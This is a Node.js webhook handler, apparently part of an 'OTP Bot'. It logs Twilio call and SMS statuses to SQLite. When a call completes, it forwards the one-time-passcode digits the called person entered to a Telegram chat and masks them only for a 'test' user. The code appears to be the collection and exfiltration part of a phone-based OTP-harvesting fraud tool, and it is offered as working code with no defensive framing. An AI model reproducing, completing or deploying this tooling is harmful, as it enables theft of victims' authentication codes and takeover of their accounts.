module.exports = function (req, res) {
  // Import the configuration file.
  const config = require("../config");
  
  // Import the telegraf module and create a new bot instance.
  const { Telegraf } = require('telegraf');
  const bot = new Telegraf(config.telegramToken);
  
  // Import the sqlite3 module and enable verbose mode for detailed error messages.
  const sqlite3 = require("sqlite3").verbose();
  
  // Create a new database object pointing to the specified database file.
  const db = new sqlite3.Database("./db/data.db");
  
  // Extract the required parameters from the request body.
  const from = req.body.From || null;
  const to = req.body.To || null;
  let sid = req.body.CallSid;
  const timestamp = Date.now();
  let status, table, sidColumn;

  // Determine if the request is for a call or SMS.
  if (sid != undefined) {
    status = req.body.CallStatus;
    table = "calls";
    sidColumn = "callSid";
  } else {
    sid = req.body.SmsSid;
    status = req.body.SmsStatus;
    table = "sms";
    sidColumn = "smssid";
  }

  // Check if all required parameters are provided.
  if (from == null || to == null || sid == undefined || sid == null) {
    return res.status(200).json({
      error: "Please send all the needed post data."
    });
  }

  // Query the database to check if the sid exists.
  db.get(`SELECT ${sidColumn} FROM ${table} WHERE ${sidColumn} = ?`, [sid], (err, row) => {
    if (err) {
      return console.log(err.message);
    }

    if (row == undefined) {
      // If the sid does not exist, insert a new record.
      db.run(`INSERT INTO ${table} (itsfrom, itsto, status, ${sidColumn}, date) VALUES (?, ?, ?, ?, ?)`, [from, to, status, sid, timestamp], function (err) {
        if (err) {
          return console.log(err.message);
        }
        return res.status(200).json({
          inserted: "All is alright."
        });
      });
    } else {
      // If the sid exists, update the existing record.
      db.run(`UPDATE ${table} SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ${sidColumn} = ?`, [status, from, to, timestamp, sid], function (err) {
        if (err) {
          return console.log(err.message);
        }

        if (table == "calls" && status == "completed" && config.telegramToken != undefined) {
          // If the call is completed, send a notification to the Telegram bot.
          db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
            if (err) {
              return console.error(err.message);
            }
            let message;
            if (callDetails.digits == "" || callDetails.digits == undefined) {
              message = "OTP Bot: \n:x: The user didn't respond or enter the code.";
            } else {
              if (callDetails.user == "test") {
                callDetails.digits = callDetails.digits.slice(0, 3) + "***";
              }
              message = `OTP Bot: \n:white_check_mark:  OTP : ||${callDetails.digits}||`;
            }
            bot.telegram.sendMessage(config.telegramChatId, message);
          });
        } else {
          // If the call is not completed, send a status update to the Telegram bot.
          db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
            if (err) {
              return console.error(err.message);
            }
            const message = `OTP Bot: \nStatus: **${status}**`;
            bot.telegram.sendMessage(config.telegramChatId, message);
          });
        }
        return res.status(200).json({
          inserted: "All is alright."
        });
      });
    }
  });
};
